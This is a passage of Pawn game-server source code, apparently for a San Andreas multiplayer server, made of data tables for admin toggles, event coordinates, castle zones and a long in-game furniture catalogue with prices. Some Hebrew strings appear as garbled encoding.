new AdminToggleType[][AdminToggleTypes] =
{
	{atoggle_cmd,1,"/togcmd","ЎЇщщф сЇўхух·"},
	{atoggle_pm,4,"/togpm","ЎЇщщф сфхуЄх· Ї°шщх·"},
	{atoggle_phone,4,"/togph","ЎЇщщф сфхуЄх· ЇьрЇхя"},
	{atoggle_gang,5,"/toggc","ЎЇщщф стрЁт Ў'рш"},
	{atoggle_clan,5,"/togcc","ЎЇщщф сўьря Ў'рш"},
	{atoggle_team,5,"/togtc","ЎЇщщф сЎ'рш ўсхЎх·"},
	{atoggle_org,5,"/togoc","ЎЇщщф сЎ'рш р°тхЁщэ"},
	{atoggle_vip,5,"/togvip","ЎЇщщф сЎ'рш ю∙·ю∙щ ысху"}
};/*
new Float:FakeAirbreakPositions[][3] =
{
	{1548.4135,-1366.4562,326.2109},
	{1574.1344,-1335.3489,16.4844},
	{-1749.9641,866.7397,25.0859},
	{-1753.6449,885.1364,295.8750},
	{-227.9525,1395.1316,69.9365},
	{-224.6216,1395.3500,172.4141}
};*/
new Float:BriefcasePositions[][4] =
{
	{315.6206,974.2534,1961.3809,3.2679},
	{313.4510,977.1934,1960.7135,1.7012},
	{313.3842,979.4409,1960.1948,1.7012},
	{313.2956,982.4268,1959.5057,1.7012},
	{318.3327,977.7731,1960.5797,1.7012},
	{318.2686,979.9371,1960.0803,1.7012},
	{318.1917,982.5301,1959.4819,1.7012},
	{315.7338,984.2606,1959.0825,1.7012},
	{315.7972,987.5323,1958.3275,1.7012},
	{315.7110,990.4340,1957.6580,1.7012},
	{315.9109,994.9324,1956.6199,1.7012},
	{315.9650,1001.0358,1955.2113,1.7012},
	{316.2705,1006.4204,1953.9688,1.7012},
	{315.9223,1011.9482,1952.6931,1.7012},
	{315.7784,1016.7943,1951.5748,1.7012},
	{315.8780,1021.6591,1950.4521,1.7012},
	{316.0057,1025.8093,1949.4944,1.7012},
	{318.1351,988.6405,1958.0718,93.2187},
	{312.9465,991.1504,1957.4926,276.2072},
	{318.2571,999.3065,1955.6105,91.9888},
	{313.4244,1004.7020,1954.3654,269.3137},
	{319.1277,1012.7834,1952.5004,86.3487},
	{312.4477,1012.5064,1952.5643,266.3487}
};
new Float:Briefcases[][4] =
{
	{113.1830,1814.4678,25.4985,94.9322},
	{110.5588,1817.3035,30.0547,36.3618},
	{118.3785,1870.6035,17.8359,270.9547},
	{213.7866,1812.7495,21.8672,190.4273},
	{274.1510,1878.2629,-20.0781,286.3808},
	{236.0703,1857.4171,17.4846,117.5158},
	{242.2946,1860.0375,14.0840,100.0417},
	{101.6485,1900.5005,33.8984,306.7478},
	{187.4698,2085.2827,22.9045,185.4867}
};
new ChatActivityBonus[][ChatActivityBonusData] =
{
	{0b00000000,0,250,"°юц"},
	{0b00000001,0,550,"°юц Єсф"},
	{0b00000010,0,700,"∙рь ∙рьф"},
	{0b00000011,2,45,"фё° ·∙хсф рч·"},
	{0b00000100,4,100,"фхёє ёщыхщ ьцыщщф"},
	{0b00000101,4,500,"фхёє ф°сф ёщыхщщ цыщщф"}
};
new SilenceStrings[][32] = {acname,"Ў'рш ыььщ","ўьря Ў'рш"};
new SilenceTimes[][SilenceData] =
{
	{"15 ∙Ёщх·",15},
	{"чЎщ уўф",30},
	{"уўф",60},
	{"∙·щ уўх·",120},
	{"5 уўх·",300},
	{"чЎщ ∙Єф",1800}
};
new ActivityIDs[][ActivityIDsData] =
{
	{"Races",true,"races"},
	{"SRaces",true,"sraces"},
	{"Server War",false,"swar"},
	{"WWE",false,"wwe"},
	{"Extra War",true,"ewar"},
	{"Zombie War",false,"zwar"},
	{"Glass",false,"glass"},
	{"Briefcase",false,"bc"},
	{"Kart",false,"kart"},
	{"Monster",false,"mons"},
	{"Kickstar",false,"ks"},
	{"Army Game",false,"ag"},
	{"War Games",true,"wg"},
	{"Manhunt",true,"mh"},
	{"Sport",true,"sport"},
	{"Team Activities",true,"ta"},
	{"Chat Activities",true,"ca"},
	{"Find The Treasure",false,"ftt"}
};
new CastlesAreas[][CastleAreaInfoData] =
{
	// id, name, author, zone_minx, zone_miny, zone_maxx, zone_maxy, color_r, color_g, color_b, hexcolor, tree_x, tree_y, tree_z
	{0,"шщ°· фруюф","EviLorD",-58.4545,1782.9812,62.5532,1925.6135,0.0,0.0,255,238,0,"FFFF33",-3.9688,1834.6200,20.6699},
	{1,"шщ°· фющэ","EviLorD",-872.0081,291.5039,-681.7575,489.7378,0.0,0.0,0,140,255,"008CFF",-724.2802,436.2037,5.1271},
	{2,"шщ°· фрххщ°","EviLorD",-1269.9761,1942.0548,-1063.1779,2059.0967,68.9848,295.7940,0,242,255,"00F2FF",-1080.1815,1974.8451,194.0074}
};
new CastleMissilesInfo[][CastleMissilesInfoData] =
{
	// castle id, offset_x, offset_y, offset_z, rot_y
	{0,7.2,1864.3,19.3,0.0,30.0,0.0},
	{0,7.2,1863.0,19.3,0.0,29.998,0.0},
	{0,6.9,1862.9,18.8,0.0,29.998,0.0},
	{0,6.9,1864.3,18.8,0.0,29.998,0.0},
	{1,-773.96350, 400.23898, 10.90158,0.00000, 30.00000, 268.58511},
	{1,-775.29401, 400.22406, 10.90359,0.00000, 30.00000, 268.58511},
	{1,-775.35974, 400.29391, 11.50760,0.00000, 30.00000, 268.58511},
	{1,-773.96350, 400.23898, 11.50760,0.00000, 30.00000, 268.58511}
	/*{2,-1166.43860, 1980.85864, 224.45500,2.00000,40.00000,270.81491},
	{2,-1166.44934, 1981.16650, 224.04280,2.00000,40.00000,270.81491},
	{2,-1167.78406, 1980.79773, 224.45500,2.00000,40.00000,270.81491},
	{2,-1167.78943, 1981.09851, 224.04280,2.00000,40.00000,270.81491}*/
};
new viewhq_prices[] = {0, 250000, 750000, 2000000, 5000000};
new viewhq_descs[][] = {"", "ўшЁф", "сщЁхЁщ·", "тухьф", "ЄЁўщ·"};
new HouseFurnitures[][HouseFurnituresEnum] =
{
	// furniture name , object id, money, category, sub category
	{0,"Freezer", 1780, 5500, 0, 0},
	{1,"LoveSet Red Refrigerator", 2127, 7820, 0, 0},
	{2,"Creamy Metal Refrigerator", 2131, 7820, 0, 0},
	{3,"Old Town Refrigerator", 2147, 7820, 0, 0},
	{4,"Freezer Chest", 2360, 6500, 0, 0},
	{0,"Maggies Co. Stove", 2017, 2400, 0, 1},
	{1,"Sterlin Co. Stove", 2135, 3000, 0, 1},
	{2,"Old Town Stove", 2144, 2100, 0, 1},
	{3,"LoveSet Stove", 2129, 4500, 0, 1},
	{4,"Creamy Metal Stove", 2134, 4500, 0, 1},
	{0,"Transparent Sides Trash Can", 1235, 50, 0, 2},
	{1,"Stone Trash Can", 1300, 140, 0, 2},
	{2,"Aluminum Lid Trash Can", 1328, 15, 0, 2},
	{3,"Ghetto Trash Can", 1329, 10, 0, 2},
	{4,"Trash Bag Covered Trash Can", 1330, 12, 0, 2},
	{5,"Tall Rolling Trash Can", 1337, 70, 0, 2},
	{6,"Light Blue Rolling Trash Can", 1339, 70, 0, 2},
	{7,"Street Trash Can", 1347, 40, 0, 2},
	{8,"Metal Plate Trash Can", 1359, 60, 0, 2},
	{9,"Hippo Trash Can", 1371, 200, 0, 2},
	{10,"White Trash Can", 2613, 50, 0, 2},
	{11,"Cluck n Bell Trash Can", 2770, 80, 0, 2},
	{0,"Microwave", 2421, 100, 0, 3},
	{1,"Toaster Oven", 2426, 150, 0, 3},
	{0,"Recycle Dumpster", 1331, 1400, 0, 4},
	{1,"Glass Recycle Dumpster", 1332, 1400, 0, 4},
	{2,"Orange Dumpster", 1333, 1200, 0, 4},
	{3,"Blue Dumpster", 1334, 1200, 0, 4},
	{4,"Clothes Recycle Dumpster", 1335, 1400, 0, 4},
	{5,"Blue Compact Dumpster", 1336, 1200, 0, 4},
	{6,"Regular Street Dumpster", 1344, 2000, 0, 4},
	{7,"Black Compact Dumpster", 1345, 1200, 0, 4},
	{8,"Packed Regular Street Dumpster", 910, 2000, 0, 4},
	{0,"Pink Queen Bed", 1700, 5750, 1, 0},
	{1,"Royal Brown Queen Bed", 1701, 6100, 1, 0},
	{2,"Green & White Backboard Queen Bed ", 1745, 6200, 1, 0},
	{3,"Stack of Mattresses", 1793, 2850, 1, 0},
	{4,"Brown Wooden Queen Bed", 1794, 6450, 1, 0},
	{5,"Basic Beach Bed", 1795, 6500, 1, 0},
	{6,"Brown Wooden Quilted Bed", 1796, 4200, 1, 0},
	{7,"Basic Bed & Stylish Legs", 1797, 5000, 1, 0},
	{8,"Basic Beach Single Bed", 1798, 7050, 1, 0},
	{9,"Brown Quilted Yellow Queen Bed", 1799, 5640, 1, 0},
	{10,"Metal Prison Bed", 1800, 1520, 1, 0},
	{11,"White Wooden Queen Bed", 1801, 7000, 1, 0},
	{12,"Floral Quilt Wooden Queen Bed", 1802, 7200, 1, 0},
	{13,"Floral Quilt Wooden Queen Bed(Overhead) ", 1803, 7300, 1, 0},
	{14,"Shiny Metal Prison Bed", 1812, 1800, 1, 0},
	{15,"Brown Quilted Queen Bed", 2299, 5640, 1, 0},
	{16,"Cabin Bed", 1302, 3900, 1, 0},
	{17,"White Police Cell Bed", 2603, 1800, 1, 0},
	{18,"Tropical Sand Queen Bed", 14866, 9150, 1, 0},
	{19,"King Size Zebra Styled Bed", 14446, 10200, 1, 0},
	{0,"Swivel Chair", 1663, 400, 1, 1},
	{1,"Arms Rest Swivel Chair", 1671, 410, 1, 1},
	{2,"Wooden Chair", 1720, 500, 1, 1},
	{3,"Metallic Chair", 1721, 50, 1, 1},
	{4,"Dinning Chair", 1739, 500, 1, 1},
	{5,"Brown Thilk Silk Arm Chair", 1754, 1080, 1, 1},
	{6,"Office Chair", 1806, 700, 1, 1},
	{7,"Fold Chair", 1810, 200, 1, 1},
	{8,"Oval Wooden Chair", 1811, 1090, 1, 1},
	{9,"Green Wooden Dining Chair", 2079, 1100, 1, 1},
	{10,"Black Wooden Dining Chair", 2120, 1150, 1, 1},
	{11,"Foldable Red Chair", 2121, 400, 1, 1},
	{12,"White Dinning Chair", 2122, 800, 1, 1},
	{13,"White Dinning Chair Wooden Legs", 2123, 900, 1, 1},
	{14,"Light Brown Wooden Dinning Chair", 2124, 850, 1, 1},
	{15,"Brown Thilk Silk Chair", 2291, 1530, 1, 1},
	{16,"Pizza Chair", 2636, 1150, 1, 1},
	{17,"Black Metallic Strip Chair", 2724, 1350, 1, 1},
	{18,"Black Metallic Strip Chair", 2777, 1325, 1, 1},
	{19,"Red & Green Metallic Burger Chair", 2788, 1350, 1, 1},
	{0,"Black Silk Arm Chair", 1704, 3000, 1, 2},
	{1,"Brown Silk Arm Chair", 1705, 3000, 1, 2},
	{2,"Chevy Arm Chair", 1707, 3500, 1, 2},
	{3,"Blue Business Arm Chair", 1708, 3800, 1, 2},
	{4,"Basic Arm Chair", 1711, 2000, 1, 2},
	{5,"Black Leather Arm Chair", 1727, 4000, 1, 2},
	{6,"Egg Shaped Basic Arm Chair", 1728, 1800, 1, 2},
	{7,"Flowered Style Country Arm Chair", 1735, 1750, 1, 2},
	{8,"Cold Autumn Styled Arm Chair", 1755, 1700, 1, 2},
	{9,"Autumn Styled Arm Chair", 1758, 1500, 1, 2},
	{10,"Basic Flower Styled Arm Chair", 1759, 1450, 1, 2},
	{11,"Basic Wooden Arm Chair", 1762, 2000, 1, 2},
	{12,"Basic Polyester Tiled Arm Chair", 1765, 1850, 1, 2},
	{13,"Basic Indian Styled Arm Chair", 1767, 1800, 1, 2},
	{14,"Blue Cotton Arm Chair", 1769, 1450, 1, 2},
	{15,"Rocking Chair", 2096, 2010, 1, 2},
	{16,"Brown Thilk Silk Arm Chair", 2292, 3550, 1, 2},
	{0,"Brown Silk Couch", 1702, 5000, 1, 3},
	{1,"Black Silk Couch", 1703, 5000, 1, 3},
	{2,"Purple Cotton Couch", 1706, 4750, 1, 3},
	{3,"Long x2 Basic Couch", 1710, 4600, 1, 3},
	{4,"Long Basic Couch", 1712, 4250, 1, 3},
	{5,"Blue Business Couch", 1713, 5850, 1, 3},
	{6,"Basic Indian Styled Couch", 1756, 3800, 1, 3},
	{7,"Autumn Styled Couch", 1757, 3600, 1, 3},
	{8,"Cold Autumn Styled Couch", 1760, 3500, 1, 3},
	{9,"Basic Wooden Couch", 1761, 4050, 1, 3},
	{10,"Basic Flower Styled Couch", 1763, 3500, 1, 3},
	{11,"Basic Polyester Tiled Couch", 1764, 3950, 1, 3},
	{12,"Blue Cotton Couch", 1768, 3650, 1, 3},
	{13,"Thick Silk Couch", 2290, 6650, 1, 3},
	{0,"Metal Stool", 1716, 650, 1, 4},
	{1,"Short Red Cotton Stool", 1805, 525, 1, 4},
	{2,"Thick Silk Foot Stool", 2293, 1000, 1, 4},
	{3,"Red Cotton Stool", 2350, 425, 1, 4},
	{4,"Retro Metal Stool", 2723, 700, 1, 4},
	{0,"Green Curtains", 2558, 750, 2, 0},
	{1,"Wide Green Curtains", 2561, 900, 2, 0},
	{0,"Confederate Flag", 2048, 500, 2, 1},
	{1,"USA Flags", 2614, 500, 2, 1},
	{2,"USA Flag", 11245, 750, 2, 1},
	{3,"Green Flag", 2914, 300, 2, 1},
	{0,"Red Mat", 2631, 350, 2, 2},
	{1,"Turquoise Mat", 2632, 350, 2, 2},
	{2,"Tiger Rug", 1828, 3000, 2, 2},
	{3,"Runway Rug", 2815, 510, 2, 2},
	{4,"Bubbles Rug", 2817, 300, 2, 2},
	{5,"Red & Orange Tile Bath Rug", 2818, 320, 2, 2},
	{6,"Royal Tan Rug", 2833, 550, 2, 2},
	{7,"Plain Tan Rug", 2834, 500, 2, 2},
	{8,"Oval Tan Rug", 2835, 430, 2, 2},
	{9,"Royal Diamond Rug", 2836, 600, 2, 2},
	{10,"Oval Water Tile Rug", 2841, 372, 2, 2},
	{11,"Pink Diamond Rug", 2842, 323, 2, 2},
	{12,"Sand Styled Rug", 2847, 300, 2, 2},
	{0,"Ancient Chinese Lion Statue", 3471, 10050, 2, 3},
	{1,"Headless Armless Woman Statue", 3935, 8000, 2, 3},
	{2,"Big Smoke Statue", 14467, 18000, 2, 3},
	{3,"Huge Buddha Statue", 14608, 50000, 2, 3},
	{4,"Dragon Head Statue", 3528, 25000, 2, 3},
	{5,"Crying Man Statue", 2745, 15000, 2, 3},
	{6,"Moose Head Statue", 1736, 5000, 2, 3},
	{0,"Green Striped Towel", 1640, 250, 2, 4},
	{1,"Blue R* Towel", 1641, 200, 2, 4},
	{2,"White Sprinkled Red Towel", 1642, 300, 2, 4},
	{3,"Wayland Towel", 1643, 245, 2, 4},
	{0,"City Painting", 2289, 2250, 2, 4},
	{1,"Boats Painting", 2287, 1500, 2, 4},
	{2,"Ship Painting", 2286, 1000, 2, 4},
	{3,"Abstract Painting", 2285, 900, 2, 4},
	{4,"Building Painting", 2284, 1500, 2, 4},
	{5,"Abstract Painting", 2283, 2300, 2, 4},
	{6,"Landscape Painting", 2282, 1300, 2, 4},
	{7,"Landscape Painting", 2281, 1300, 2, 4},
	{8,"Landscape Painting", 2280, 1500, 2, 4},
	{9,"Landscape Painting", 2279, 1400, 2, 4},
	{10,"Boat Painting", 2278, 950, 2, 4},
	{11,"Cat Painting", 2277, 1000, 2, 4},
	{12,"Bridge Painting", 2276, 1200, 2, 4},
	{13,"Fruits Painting", 2275, 1000, 2, 4},
	{14,"Flowers Painting", 2274, 1500, 2, 4},
	{15,"Flowers Painting", 2273, 1250, 2, 4},
	{16,"Landscape Painting", 2272, 800, 2, 4},
	{17,"Abstract Painting", 2271, 750, 2, 4},
	{18,"Leaves Painting", 2270, 1250, 2, 4},
	{19,"Landscape Painting", 2269, 1100, 2, 4},
	{20,"Cat Painting", 2268, 1250, 2, 4},
	{21,"Ship Painting", 2267, 1000, 2, 4},
	{22,"City Painting", 2266, 850, 2, 4},
	{23,"Landscape Painting", 2265, 1400, 2, 4},
	{24,"Beach Painting", 2264, 1350, 2, 4},
	{25,"City Painting", 2263, 1500, 2, 4},
	{26,"City Painting", 2262, 1450, 2, 4},
	{27,"Bridge Painting", 2261, 1500, 2, 4},
	{28,"Boat Painting", 2260, 1000, 2, 4},
	{29,"Landscape Painting", 2258, 2000, 2, 4},
	{30,"Abstract Painting", 2257, 1200, 2, 4},
	{31,"Landscape Painting", 2256, 2250, 2, 4},
	{32,"Candy Suxx Painting", 2255, 4500, 2, 4},
	{0,"Plant Top", 859, 350, 2, 5},
	{1,"Bushy Plant Top", 860, 375, 2, 5},
	{2,"Tall Plant Top", 861, 345, 2, 5},
	{3,"Tall Orange Plant Top", 862, 400, 2, 5},
	{4,"Cactus Top", 863, 700, 2, 5},
	{5,"Planted Bush", 638, 2500, 2, 5},
	{6,"Long Planted Bush", 640, 3000, 2, 5},
	{7,"Dry Plant Pot", 948, 800, 2, 5},
	{8,"Normal Plant Pot", 949, 100, 2, 5},
	{9,"Big Dry Plants Pot", 950, 1200, 2, 5},
	{10,"Long Plants Pot", 2001, 1350, 2, 5},
	{11,"Long Plants Pot 2", 2010, 1400, 2, 5},
	{12,"Long Plants Pot 3", 2011, 1500, 2, 5},
	{13,"Short Plants Pot", 2194, 700, 2, 5},
	{14,"Short Plants Pot 2", 2195, 950, 2, 5},
	{15,"Empty Pot", 2203, 200, 2, 5},
	{16,"Weeds In Red Pot", 2240, 200, 2, 5},
	{17,"Rusty Pottery Plant", 2241, 1200, 2, 5},
	{18,"Empty Red Pot", 2242, 350, 2, 5},
	{19,"Empty Red Pot 2", 2243, 400, 2, 5},
	{20,"Plants With Big Wooden Pot", 2244, 1500, 2, 5},
	{21,"Red Flowers With Wide Modern Pot", 2245, 1400, 2, 5},
	{22,"Empty White Vase", 2246, 2000, 2, 5},
	{23,"Oriental Plants In Glass Vase", 2247, 1650, 2, 5},
	{24,"Empty Tall Red Vase", 2248, 1000, 2, 5},
	{25,"Oriental Flowers In Glass Vase", 2249, 1500, 2, 5},
	{26,"Spring Flowers In Glass Vase", 2250, 1200, 2, 5},
	{27,"Oriental Flowers In Blue Designer Glass ", 2251, 1600, 2, 5},
	{28,"Small Bowl Plant", 2252, 1000, 2, 5},
	{29,"Red Flowers In Wooden Cube", 2253, 1500, 2, 5},
	{30,"Vines", 2345, 700, 2, 5},
	{31,"Hanging Red Flowers", 3802, 2250, 2, 5},
	{32,"Wall Mounted Flowers", 3806, 2500, 2, 5},
	{33,"Hanging Flowers", 3810, 2250, 2, 5},
	{34,"Wall Mounted Flowers With Dandelions ", 3811, 3000, 2, 5},
	{35,"Dark Exotic Plants", 14804, 2400, 2, 5},
	{36,"Dark Exotic Tree Plant", 14834, 2300, 2, 5},
	{37,"Potted Shrub", 15038, 1200, 2, 5},
	{0,"Shooting Target", 2049, 140, 2, 6},
	{1,"Shooting Targets", 2050, 140, 2, 6},
	{2,"Inverted Shooting Target", 2051, 140, 2, 6},
	{3,"Base 5 Poster", 2691, 140, 2, 6},
	{4,"Thin Bare 5 Poster", 2695, 70, 2, 6},
	{5,"Thin Bare 5 Dog Poster", 2696, 70, 2, 6},
	{6,"Wheelchairster Cutout Poster", 2692, 200, 2, 6},
	{7,"Nino Cutout Poster", 2693, 200, 2, 6},
	{8,"Filthy Chicks Poster", 2587, 140, 2, 6},
	{9,"Candy Suxx Set Poster", 2588, 140, 2, 6},
	{0,"Punching Bag", 1985, 5000, 3, 0},
	{1,"Treadmill", 2627, 13000, 3, 0},
	{2,"Weight Lifting Bench", 2628, 7500, 3, 0},
	{3,"Weight Lifting Bench", 2629, 7500, 3, 0},
	{4,"One Dumbbell", 2916, 2500, 3, 0},
	{5,"Two Dumbbells", 2915, 5000, 3, 0},
	{6,"Exersise Bike", 2630, 10000, 3, 0},
	{7,"Blue Pool Table", 2964, 15000, 3, 0},
	{8,"Pool Cue", 338, 700, 3, 0},
	{9,"Pool: Cue Ball", 3003, 1500, 3, 0},
	{10,"Pool: 8 Ball", 3106, 1000, 3, 0},
	{11,"Pool: Red Solid Ball", 3105, 700, 3, 0},
	{12,"Pool: Green Soild Ball", 3104, 700, 3, 0},
	{13,"Pool: Orange Solid Ball", 3103, 700, 3, 0},
	{14,"Pool: Purple Solid Ball", 3102, 700, 3, 0},
	{15,"Pool: Red Solid Ball", 3101, 700, 3, 0},
	{16,"Pool: Blue Solid Ball", 3100, 700, 3, 0},
	{17,"Pool: Yellow Solid Ball", 3002, 700, 3, 0},
	{18,"Pool: Maroon Stripe Ball", 3001, 700, 3, 0},
	{19,"Pool: Green Stripe Ball", 3000, 700, 3, 0},
	{20,"Pool: Orange Stripe Ball", 2999, 700, 3, 0},
	{21,"Pool: Purple Stripe Ball", 2998, 700, 3, 0},
	{22,"Pool: Red Stripe Ball", 2997, 700, 3, 0},
	{23,"Pool: Blue Stripe Ball", 2996, 700, 3, 0},
	{24,"Pool: Yellow Stripe Ball", 2995, 700, 3, 0},
	{25,"Hanging Basketball Goal", 3497, 3000, 3, 0},
	{26,"Basketball", 2114, 1100, 3, 0},
	{0,"Small Black Television", 14772, 3800, 3, 1},
	{1,"Wooden Television", 1748, 4550, 3, 1},
	{2,"Rusty Television", 1747, 4000, 3, 1},
	{3,"Dark Wooden Television", 1429, 4500, 3, 1},
	{4,"Wooden White Television", 1750, 4550, 3, 1},
	{5,"Tall Black Television", 1518, 5000, 3, 1},
	{6,"Television On Top Of DVD", 2595, 3600, 3, 1},
	{7,"Rolling Television Stand", 14604, 4000, 3, 1},
	{8,"Mounted Black Television", 2700, 4300, 3, 1},
	{9,"White Metal Television", 1751, 4700, 3, 1},
	{10,"Tall Black Television", 1518, 5000, 3, 1},
	{11,"Durable Portable Television", 1749, 3500, 3, 1},
	{12,"Slim Tall Black Television", 1791, 5300, 3, 1},
	{13,"Medium Black Television", 1752, 4200, 3, 1},
	{14,"Orange Sphere Television", 2224, 5000, 3, 1},
	{15,"Slim Grey Television", 1792, 5200, 3, 1},
	{16,"4 Surveillance TV Screens", 2606, 13950, 3, 1},
	{17,"Large Wide Television", 1786, 5500, 3, 1},
	{0,"Triple Play Poker Machine", 1515, 20000, 3, 2},
	{1,"Go Go Space Monkey Arcade Machine ", 2681, 17500, 3, 2},
	{2,"Bee Bee Gone Arcade Machine", 2778, 17500, 3, 2},
	{3,"Duality Arcade Machine", 2779, 17500, 3, 2},
	{4,"Super PlayBox", 1718, 8000, 3, 2},
	{5,"Xbox 360 Console", 2028, 10000, 3, 2},
	{0,"Hl-DE DVD Player", 1782, 3240, 3, 3},
	{1,"DVR620 DVD Player", 1783, 3500, 3, 3},
	{2,"Sunny DVD Player", 1785, 4400, 3, 3},
	{3,"BD655 Blu-Ray Player", 1787, 4300, 3, 3},
	{4,"BD670 Blu-Ray Player", 1788, 4500, 3, 3},
	{5,"DVR620 DVD Player", 1790, 3500, 3, 3},
	{0,"Stereo System & Speakers", 2094, 2025, 3, 4},
	{1,"Stereo System", 1809, 2500, 3, 4},
	{2,"Retro Boombox", 2102, 2800, 3, 4},
	{3,"White Boombox", 2103, 3000, 3, 4},
	{4,"Stereo System Stand", 2104, 3400, 3, 4},
	{5,"Boombox", 2226, 3500, 3, 4},
	{0,"Metal Plate Speaker", 2229, 13000, 3, 5},
	{1,"Wooden Speaker", 2230, 12000, 3, 5},
	{2,"Wooden Speaker Amplifier", 2231, 7000, 3, 5},
	{3,"Metal Plate Speaker Amplifier", 2232, 9200, 3, 5},
	{4,"Futuristic Speaker", 2233, 13000, 3, 5},
	{0,"Lava Lamp", 2238, 900, 4, 0},
	{1,"Work Lamp", 2196, 800, 4, 0},
	{2,"White Lamp", 2707, 860, 4, 0},
	{3,"Red Lamp", 2726, 860, 4, 0},
	{4,"Red Lamp Style 2", 3534, 860, 4, 0},
	{0,"Gray Sconce", 1731, 1500, 4, 1},
	{1,"Sun Sconce", 2178, 5750, 4, 1},
	{2,"Bulkhead Light", 3785, 1600, 4, 1},
	{3,"Industrial Light", 921, 1200, 4, 1},
	{4,"20th Century Sconce", 3801, 1700, 4, 1},
	{5,"Car Light", 19280, 1700, 4, 1},
	{0,"Chain Linked Ceiling Light", 945, 2870, 4, 2},
	{1,"Glass Ceiling Light", 1734, 3000, 4, 2},
	{2,"Long Bulb Ceiling Light", 1893, 2500, 4, 2},
	{3,"Cone Ceiling Light", 2026, 3400, 4, 2},
	{4,"Brown Threaded Ceiling Light", 2073, 3200, 4, 2},
	{5,"Hanging Light Bulb", 2074, 200, 4, 2},
	{6,"Romantic Red Ceiling Light", 2075, 3500, 4, 2},
	{7,"Hanging Bowl Ceiling Light", 2076, 3700, 4, 2},
	{8,"Wooden Ceiling Fan", 16779, 3800, 4, 2},
	{0,"Red Neon Light", 18647, 3200, 4, 3},
	{1,"Blue Neon Light", 18648, 3200, 4, 3},
	{2,"Green Neon Light", 18649, 3200, 4, 3},
	{3,"Yellow Neon Light", 18650, 3200, 4, 3},
	{4,"Pink Neon Light", 18651, 3200, 4, 3},
	{5,"White Neon Light", 18652, 3200, 4, 3},
	{0,"Plain Toilet", 2514, 3500, 5, 0},
	{1,"White Metal Toilet", 2521, 3750, 5, 0},
	{2,"Sauna Toilet", 2525, 5000, 5, 0},
	{3,"Black Wooden Toilet", 2528, 5500, 5, 0},
	{4,"Standard Toilet ", 2732, 4500, 5, 0},
	{0,"Maggies Co. Sink", 2013, 3850, 5, 1},
	{1,"LoveSet Sink", 2130, 4900, 5, 1},
	{2,"Creamy Metal Sink", 2132, 4600, 5, 1},
	{3,"Sterlin Co. Metal Sink", 2136, 3000, 5, 1},
	{4,"Old Town Sink pt. 1", 2148, 2000, 5, 1},
	{5,"Old Town Sink pt. 2", 2150, 500, 5, 1},
	{6,"Wooden Snow White Sink", 2154, 3850, 5, 1},
	{7,"Mahogany Green Wood Sink", 2336, 3000, 5, 1},
	{8,"Basic Bathroom Sink", 2518, 1550, 5, 1},
	{9,"Bathroom Sink With Pad", 2523, 2550, 5, 1},
	{10,"Sauna Bathroom Sink", 2524, 2200, 5, 1},
	{11,"Bare Bathroom Sink", 2739, 1700, 5, 1},
	{0,"Silver Glass Shower", 2517, 8000, 5, 2},
	{1,"Dark Metal Shower", 2520, 7550, 5, 2},
	{2,"Sauna Shower", 2527, 7000, 5, 2},
	{0,"Sprunk Bath Tub", 2097, 8000, 5, 3},
	{1,"Sparkly White Bath Tub", 2516, 7500, 5, 3},
	{2,"White Bath Tub", 2519, 7900, 5, 3},
	{3,"Dark Wooden Bath Tub", 2522, 8200, 5, 3},
	{4,"Sauna Wooden Bath Tub", 2526, 8500, 5, 3},
	{0,"Sealed Safe", 2332, 10000, 6, 0},
	{0,"Half Empty Book Shelf", 1742, 3000, 6, 1},
	{1,"Large Green Book Shelves", 14455, 3000, 6, 1},
	{2,"Three Wooden Level Book Shelf", 2608, 2500, 6, 1},
	{0,"Standard Wooden Dresser", 1417, 3250, 6, 2},
	{1,"Light Wooden Dresser Bottom Opening ", 1740, 3500, 6, 2},
	{2,"Long Light Wooden Dresser", 1741, 4300, 6, 2},
	{3,"Stylish Light Wooden Dresser", 1743, 4500, 6, 2},
	{4,"Light Wooden Dresser Bottom Opening Legs", 2087, 3500, 6, 2},
	{5,"Long Light Wooden Dresser Legs", 2088, 4300, 6, 2},
	{6,"Dark Wooden Dresser", 2089, 4300, 6, 2},
	{7,"Long Light Wooden Dresser Thin Legs", 2094, 4000, 6, 2},
	{8,"Large Dark Wooden Dresser", 2204, 6000, 6, 2},
	{9,"Light Wooden Dresser", 2025, 5000, 6, 2},
	{10,"Light Pink Wooden Dresser", 2020, 3000, 6, 2},
	{11,"Small Light Pink Wooden Dresser", 2021, 2300, 6, 2},
	{0,"Metal Filing Cabinet", 2000, 1500, 6, 3},
	{1,"Double Filing Cabinet", 2007, 3000, 6, 3},
	{2,"Green Metal Filing Cabinet", 2065, 1500, 6, 3},
	{3,"Wooden Filing Cabinet", 2066, 1500, 6, 3},
	{4,"Light Blue Metal Filing Cabinet", 2067, 1500, 6, 3},
	{5,"Wall Mounted Filing Cabinet", 2163, 900, 6, 3},
	{6,"Tall Wall Mounted Filing Cabinet", 2200, 1200, 6, 3},
	{7,"Brown Metal Filing Cabinet", 2197, 1500, 6, 3},
	{8,"Light Blue & Brown Metal Filing Cabinet ", 2610, 1500, 6, 3},
	{9,"Big Oak Filing Cabinet", 2167, 3000, 6, 3},
	{0,"LoveSet Pantry", 2128, 3000, 6, 4},
	{1,"Sterlin Co. Pantry", 2140, 2000, 6, 4},
	{2,"Creamy Metal Pantry", 2141, 2500, 6, 4},
	{3,"Old Town Pantry", 2145, 2500, 6, 4},
	{4,"Wooden Snow White Pantry", 2153, 2000, 6, 4},
	{5,"Mahogany Green Wood Pantry", 2158, 2000, 6, 4},
	{0,"Long Wooden Table", 2359, 2500, 7, 0},
	{1,"Marble Top Table", 2118, 3000, 7, 0},
	{2,"Pine Wood Table", 2117, 3000, 7, 0},
	{3,"Glass Oval Table", 2086, 4500, 7, 0},
	{4,"Beech Wood Table", 2029, 1500, 7, 0},
	{5,"Mahogany Wood Table", 2080, 3500, 7, 0},
	{6,"Oak Wood Table", 2115, 4700, 7, 0},
	{7,"Basic Wood Table", 2110, 1500, 7, 0},
	{8,"Paint Covered Table", 1770, 2000, 7, 0},
	{9,"Oak Wood Table", 2031, 4700, 7, 0},
	{10,"Basic Pine Wood Table", 1737, 1850, 7, 0},
	{11,"Table With TV", 15037, 4000, 7, 0},
	{0,"Basic Oak Coffee Table", 1813, 5750, 7, 1},
	{1,"Fancy Oak Coffee Table/Drawers", 1814, 5500, 7, 1},
	{2,"Oval Coffee Table", 1815, 3750, 7, 1},
	{3,"Fancy Oak Coffee Table", 1817, 5500, 7, 1},
	{4,"Square Oak Coffee Table", 1818, 5750, 7, 1},
	{5,"Fancy Circle Coffee Table", 1819, 4500, 7, 1},
	{6,"Basic Circle Coffee Table", 1820, 3750, 7, 1},
